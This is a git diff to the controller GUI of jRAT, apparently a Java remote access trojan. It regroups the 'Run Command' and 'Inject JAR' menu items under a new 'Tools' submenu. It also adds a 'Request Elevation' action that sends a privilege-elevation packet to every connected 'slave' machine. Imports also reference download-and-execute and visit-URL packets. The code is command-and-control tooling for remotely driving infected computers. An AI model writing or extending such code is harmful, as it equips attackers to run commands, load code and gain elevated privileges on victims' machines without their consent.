@@ -67,6 +67,7 @@ import su.jrat.client.events.Events;
 import su.jrat.client.listeners.CountryMenuItemListener;
 import su.jrat.client.net.URLParser;
 import su.jrat.client.net.WebRequest;
+import su.jrat.client.packets.outgoing.Packet100RequestElevation;
 import su.jrat.client.packets.outgoing.Packet11Disconnect;
 import su.jrat.client.packets.outgoing.Packet14VisitURL;
 import su.jrat.client.packets.outgoing.Packet17DownloadExecute;
@@ -1417,32 +1418,35 @@ public class Frame extends BaseFrame {
 			}
 		});
 		mnQuickOpen.add(mntmNotes);
-		popupMenu.addSeparator();
+		
+		JMenu mnTools_1 = new JMenu("Tools");
+		mnTools_1.setIcon(new ImageIcon(Frame.class.getResource("/icons/toolbox.png")));
+		popupMenu.add(mnTools_1);
+		
+				JMenuItem mntmRunCommand = new JMenuItem("Run Command");
+				mnTools_1.add(mntmRunCommand);
+				mntmRunCommand.addActionListener(new ActionListener() {
+					public void actionPerformed(ActionEvent arg0) {
+						List<AbstractSlave> servers = Utils.getSlaves();
+						if (servers.size() > 0) {
+							String process = Utils.showDialog("Run Command", "Select command to send to connections");
+							if (process == null) {
+								return;
+							}
 
-		JMenuItem mntmRunCommand = new JMenuItem("Run Command");
-		mntmRunCommand.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				List<AbstractSlave> servers = Utils.getSlaves();
-				if (servers.size() > 0) {
-					String process = Utils.showDialog("Run Command", "Select command to send to connections");
-					if (process == null) {
-						return;
-					}
-
-					for (AbstractSlave slave : servers) {
-						if (slave instanceof Slave) {
-							((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
+							for (AbstractSlave slave : servers) {
+								if (slave instanceof Slave) {
+									((Slave)slave).addToSendQueue(new Packet38RunCommand(process));
+								}
+							}
 						}
 					}
-				}
-			}
-		});
-		mntmRunCommand.setIcon(new ImageIcon(Frame.class.getResource("/icons/runcmd.png")));
-		popupMenu.add(mntmRunCommand);
+				});
+				mntmRunCommand.setIcon(new ImageIcon(Frame.class.getResource("/icons/runcmd.png")));
 
 		JMenu mnInject = new JMenu("Inject JAR");
+		mnTools_1.add(mnInject);
 		mnInject.setIcon(new ImageIcon(Frame.class.getResource("/icons/inject.png")));
-		popupMenu.add(mnInject);
 
 		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
 		mntmInjectFromUrl.addActionListener(new ActionListener() {
@@ -1508,6 +1512,21 @@ public class Frame extends BaseFrame {
 		});
 		mntmInjectFromFile.setIcon(new ImageIcon(Frame.class.getResource("/icons/drive-upload.png")));
 		mnInject.add(mntmInjectFromFile);
+		
+		JMenuItem mntmRequestElevation = new JMenuItem("Request Elevation");
+		mntmRequestElevation.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				List<AbstractSlave> servers = Utils.getSlaves();
+
+				for (AbstractSlave slave : servers) {
+					if (slave instanceof Slave) {
+						((Slave)slave).addToSendQueue(new Packet100RequestElevation());
+					}
+				}
+			}
+		});
+		mntmRequestElevation.setIcon(new ImageIcon(Frame.class.getResource("/icons/shield.png")));
+		mnTools_1.add(mntmRequestElevation);
 		popupMenu.addSeparator();
 
 		JMenuItem mntmInfo = new JMenuItem("Info");
